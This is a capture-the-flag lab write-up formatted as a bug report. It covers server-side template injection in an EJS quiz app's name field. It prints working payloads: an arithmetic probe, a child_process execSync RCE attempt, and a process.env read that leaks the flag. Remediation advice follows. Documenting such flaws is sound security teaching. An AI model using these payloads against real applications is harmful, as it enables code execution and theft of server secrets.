# Bug Report - predictor-001: EJS SSTI in Name Field Allows Environment Variable Read

**Lab:** predictor-001  
**Difficulty:** Easy  
**Date:** 2026-06-26  
**Severity:** High  
**CWE:** CWE-94 (Improper Control of Generation of Code)  
**CVSS:** 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N) - no auth required, server-side code execution

---

## Summary

The application accepts a free-text name answer during its quiz flow and interpolates it directly into an EJS template on the results page without sanitization. EJS `<%= %>` tags in the name field are executed server-side. Although `child_process` calls are blocked by a filter, the flag is stored in a process environment variable and is readable with a one-liner `<%= process.env.FLAG %>`, bypassing the filter entirely.

---

## Steps to Reproduce

**Step 1 - Confirm SSTI with an arithmetic probe**

The quiz flow submits answers to `POST /api/answer` one at a time, tracked by session cookie. Submit `<%= 7*7 %>` as the name:

```http
POST /api/answer HTTP/1.1
Host: lab-1782472998281-nni21z.labs-app.bugforge.io
Content-Type: application/json
Cookie: connect.sid=s%3Aw4Ex34fARFTsdDUlqKfmCnc2jDG4MZSN.79Gh...

{"questionId":"name","answer":"<%= 7*7 %>"}
```

Then submit the remaining three answers:

```http
POST /api/answer HTTP/1.1
{"questionId":"color","answer":"Purple"}

POST /api/answer HTTP/1.1
{"questionId":"cheese","answer":"Yes"}

POST /api/answer HTTP/1.1
{"questionId":"beverage","answer":"Tea"}
```

**Step 2 - Check the result page**

```http
GET /result HTTP/1.1
Host: lab-1782472998281-nni21z.labs-app.bugforge.io
Cookie: connect.sid=s%3Aw4Ex34fARFTsdDUlqKfmCnc2jDG4MZSN.79Gh...
```

Response (excerpt):
```html
<p class="greeting-text">Hello, 49! ✨</p>
```

`7*7` evaluated to `49` - SSTI confirmed.

**Step 3 - Attempt RCE via child_process (blocked)**

```
<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
```

Response:
```html
<p class="greeting-text">Hello, Vibes were blocked - try to find the flag instead! ✨</p>
```

`child_process` is filtered. The filter message itself hints that the flag is stored somewhere accessible.

**Step 4 - Read the flag from process.env**

`process.env` is available in the EJS execution context and requires no `child_process` call:

```http
POST /api/answer HTTP/1.1
Host: lab-1782472998281-nni21z.labs-app.bugforge.io
Content-Type: application/json
Cookie: connect.sid=<fresh-session>

{"questionId":"name","answer":"<%= process.env.FLAG %>"}
```

Submit remaining answers, then visit `/result`:

```html
<p class="greeting-text">Hello, bug{EQBUZPTKunhTHKjOpuemq0wGn7mhmBtC}! ✨</p>
```

---

## Impact

- Arbitrary server-side JavaScript execution in the Node.js process context
- Full read of all environment variables including secrets, credentials, and the flag
- The `child_process` block is ineffective as a defence - environment variables, file system (`fs`), and other Node.js globals remain accessible
- No authentication is required; any visitor can trigger SSTI via the public quiz flow

---

## Root Cause

The name answer is interpolated directly into an EJS template string at render time without any sanitization or output escaping of the `<% %>` delimiters. EJS treats any `<%= expression %>` in the rendered string as executable code. Blocking one escalation path (`child_process`) does not fix the underlying injection - the template context still exposes `process.env`, `fs`, and the full Node.js runtime.

---

## Remediation

1. Never insert user-supplied input directly into a template string - pass it as a data variable and render it with `<%- sanitize(name) %>` or `<%= name %>` (HTML-escaped, not raw code)
2. Use a logic-less templating engine (Mustache, Handlebars with no helpers) for pages that render user content
3. Do not store secrets in `process.env` on a server that executes user-controlled code - use a secrets manager with access control
4. If a blocklist is used, treat it as a defence-in-depth layer only, never as the primary control

---

## Flag

`bug{EQBUZPTKunhTHKjOpuemq0wGn7mhmBtC}`
